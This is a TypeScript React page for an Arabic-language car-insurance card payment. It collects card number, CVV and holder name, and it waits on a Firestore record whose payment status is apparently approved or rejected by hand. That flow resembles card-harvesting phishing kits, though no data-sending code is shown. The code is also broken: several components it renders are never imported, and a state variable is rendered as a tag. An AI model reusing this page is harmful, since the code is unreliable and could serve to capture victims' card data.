"use client"

import { useEffect, useState } from "react"
import { z } from "zod"
import { motion, AnimatePresence } from "framer-motion"
import Header from "@/components/Header"
import Footer from "@/components/Footer"

import WaitingDialog from "@/components/waiting-dilaog"
import { RefreshCw } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, onSnapshot } from "firebase/firestore"
import { PaymentMethods } from "@/components/Payment-methods"

// Define the schema for payment form validation
export const PaymentSchema = z.object({
  card_number: z.string().min(16, "رقم البطاقة يجب أن يكون 16 رقم"),
  expiration_date: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, "تاريخ انتهاء البطاقة غير صالح"),
  cvv: z.string().regex(/^\d{3,4}$/, "رمز الأمان يجب أن يكون 3 أو 4 أرقام"),
  card_holder_name: z.string().min(3, "اسم حامل البطاقة مطلوب"),
  save_card: z.boolean().optional(),
})

// Define types for our state
export interface PolicyDetailsType {
  insurance_type: string
  company: string
  start_date: string
  endDate: string
  referenceNumber: string
}

export interface SummaryDetailsType {
  subtotal: number
  vat: number
  total: number
}

// AdPopup Component
const AdPopup = ({ onClose }: { onClose: () => void }) => (
  <motion.div
    initial={{ opacity: 0 }}
    animate={{ opacity: 1 }}
    exit={{ opacity: 0 }}
    className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm"
  >
    <motion.div
      initial={{ scale: 0.9, opacity: 0 }}
      animate={{ scale: 1, opacity: 1 }}
      exit={{ scale: 0.9, opacity: 0 }}
      className="bg-white rounded-2xl max-w-lg w-full overflow-hidden"
    >
      <img src="/5990160849186178736.jpg" alt="Special Offer" className="w-full h-auto object-cover" />
      <div className="p-6 text-center">
        <button
          onClick={onClose}
          className="bg-[#146394] text-white px-8 py-3 rounded-lg font-semibold transition-all hover:bg-[#0f4c70] transform hover:scale-[0.98] active:scale-[0.97]"
        >
          متابعة
        </button>
      </div>
    </motion.div>
  </motion.div>
)

// Payment Status Dialog Component
const PaymentStatusDialog = () => (
  <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
    <motion.div
      initial={{ scale: 0.9, opacity: 0 }}
      animate={{ scale: 1, opacity: 1 }}
      exit={{ scale: 0.9, opacity: 0 }}
      className="bg-white rounded-2xl max-w-lg w-full overflow-hidden p-6 text-center"
    >
      <div className="mb-4">
        <div className="mx-auto w-16 h-16 flex items-center justify-center bg-yellow-100 rounded-full mb-4">
          <RefreshCw className="h-8 w-8 text-yellow-500" />
        </div>
        <h3 className="text-xl font-bold mb-2">حالة الدفع معلقة</h3>
        <p className="text-gray-600 mb-4">
          عملية الدفع الخاصة بك قيد المعالجة. يرجى تحديث الصفحة للتحقق من حالة الدفع.
        </p>
      </div>
    </motion.div>
  </div>
)

export default function PaymentPage() {
  const [showAd, setShowAd] = useState(true)
  const [isloading, setIsloading] = useState(false)
  const [showWaitingDialog, setShowWaitingDialog] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<string | null>(null)
  const [paymentId, setPaymentId] = useState<string | null>(null)

  // Check for payment status in localStorage on component mount
  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedPaymentStatus = localStorage.getItem("paymentStatus")
      if (storedPaymentStatus === "pending" || storedPaymentStatus === "processing") {
        setPaymentStatus(storedPaymentStatus)
      }
    }
  }, [])

  useEffect(() => {
    // Set payment ID from localStorage if available
    if (typeof window !== "undefined") {
      const storedPaymentId = localStorage.getItem("visitor")
      if (storedPaymentId) {
        setPaymentId(storedPaymentId)
      }
    }
  }, [])

  // Check payment status from Firestore
  useEffect(() => {
    if (!paymentId) return

    const paymentRef = doc(db, "pays", paymentId)

    // Set up real-time listener for payment status changes
    const unsubscribe = onSnapshot(
      paymentRef,
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          setPaymentStatus(data.paymentStatus)

          // If status is pending or processing, keep dialog open
          if (data.paymentStatus === "pending" || data.paymentStatus === "processing") {
            setIsloading(true)
            setShowWaitingDialog(true)
            // Save status to localStorage to persist across page refreshes
            localStorage.setItem("paymentStatus", data.paymentStatus)
          } else if (data.paymentStatus === "rejected" || data.paymentStatus === "failed") {
            setIsloading(false)
            setShowWaitingDialog(false)
            // Clear status from localStorage if payment is complete or failed
            alert("فشل عملبة الدفع يرجى المحاولة مرة أخرى")
          }
        } else if (paymentStatus === "approved" || paymentStatus === "completed") {
          // Document doesn't exist
          setIsloading(false)
          setShowWaitingDialog(false)
          // The user will handle the redirection or any other action
        }
      },
      (error) => {
        console.error("Error fetching payment status:", error)
        setIsloading(false)
        setShowWaitingDialog(false)
      },
    )

    // Clean up the listener when component unmounts
    return () => unsubscribe()
  }, [paymentId, paymentStatus])

  // Add event listener for beforeunload to prevent accidental navigation during pending payment
  useEffect(() => {
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      if (paymentStatus === "pending" || paymentStatus === "processing") {
        // Standard for most browsers
        e.preventDefault()
        // For older browsers
        e.returnValue = ""
        return ""
      }
    }

    window.addEventListener("beforeunload", handleBeforeUnload)
    return () => {
      window.removeEventListener("beforeunload", handleBeforeUnload)
    }
  }, [paymentStatus])

  const [policyDetails] = useState<PolicyDetailsType>(() => {
    if (typeof window !== "undefined") {
      const paymentDetails = localStorage.getItem("paymentDetails")
      if (paymentDetails) {
        const parsed = JSON.parse(paymentDetails)
        return (
          parsed.policyDetails || {
            insurance_type: "شامل",
            company: "شركة التأمين",
            start_date: new Date().toISOString().split("T")[0],
            endDate: new Date(new Date().setFullYear(new Date().getFullYear() + 1)).toISOString().split("T")[0],
            referenceNumber: Math.floor(100000000 + Math.random() * 900000000).toString(),
          }
        )
      }
    }
    return {
      insurance_type: "شامل",
      company: "شركة التأمين",
      start_date: new Date().toISOString().split("T")[0],
      endDate: new Date(new Date().setFullYear(new Date().getFullYear() + 1)).toISOString().split("T")[0],
      referenceNumber: Math.floor(100000000 + Math.random() * 900000000).toString(),
    }
  })

  const [summaryDetails] = useState<SummaryDetailsType>(() => {
    if (typeof window !== "undefined") {
      const paymentDetails = localStorage.getItem("paymentDetails")
      if (paymentDetails) {
        const parsed = JSON.parse(paymentDetails)
        return (
          parsed.summaryDetails || {
            subtotal: 500,
            vat: 0.15,
            total: 575,
          }
        )
      }
    }
    return {
      subtotal: 500,
      vat: 0.15,
      total: 575,
    }
  })

  return (
    <>
      <Header />
      <AnimatePresence>{showAd && <AdPopup onClose={() => setShowAd(false)} />}</AnimatePresence>
      <AnimatePresence>{showWaitingDialog && <WaitingDialog isOpen={false} />}</AnimatePresence>

      {/* Remove AnimatePresence for PaymentStatusDialog to prevent it from being removed on exit animations */}
      {(paymentStatus === "pending" || paymentStatus === "processing") && <PaymentStatusDialog />}

      <div className="bg-gradient-to-br from-gray-50 to-blue-50 py-8 md:py-12">
        <div className="max-w-7xl mx-auto px-4">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 md:gap-8">
            <div className="lg:col-span-2 space-y-6 md:space-y-8">
              <policyDetails policyDetails={policyDetails} />
              <PaymentMethods />
            </div>
            <div className="lg:sticky lg:top-40 h-fit">
              <PaymentForm />
              <PaymentSummary summaryDetails={summaryDetails} />
            </div>
          </div>
        </div>
      </div>
      <Footer />
    </>
  )
}

